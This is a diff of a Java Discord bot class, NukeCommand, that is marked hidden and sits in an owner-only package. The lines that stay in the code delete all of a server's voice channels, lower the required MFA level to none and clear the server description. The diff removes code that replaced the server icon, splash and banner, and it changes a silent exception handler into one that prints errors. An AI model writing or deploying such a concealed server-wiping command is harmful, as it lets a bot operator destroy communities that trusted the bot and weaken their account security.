@@ -17,13 +17,9 @@ public class NukeCommand extends Command {
         this.hidden = true;
     }
 
-    private final File temp = new File("me/kambing/commands/owner/kambing.jpg");
-
     @Override
     protected void execute(CommandEvent e) {
         try {
-
-            final Icon icon = Icon.from(temp);
 
             for (VoiceChannel ch : e.getGuild().getVoiceChannels()) {
                 ch.delete().queue();
@@ -61,21 +57,6 @@ public class NukeCommand extends Command {
 
             m.setRequiredMFALevel(Guild.MFALevel.NONE).queue();
 
-
-            m.setIcon(icon).queue();
-
-            m.setSystemChannel(null).queue();
-
-
-            if (m.getGuild().getBoostTier().equals(Guild.BoostTier.TIER_1)) {
-                m.setSplash(icon).queue();
-            }
-
-            if (m.getGuild().getBoostTier().equals(Guild.BoostTier.TIER_2)) {
-                m.setSplash(icon).queue();
-                m.setBanner(icon).queue();
-            }
-
             if (m.getGuild().getDescription() != null) {
                 m.setDescription("").queue();
             }
@@ -94,7 +75,8 @@ public class NukeCommand extends Command {
                 });
             }
 
-        }catch (Exception ignored) {
+        }catch (Exception ex) {
+            System.out.println(ex);
         }
     }
 }
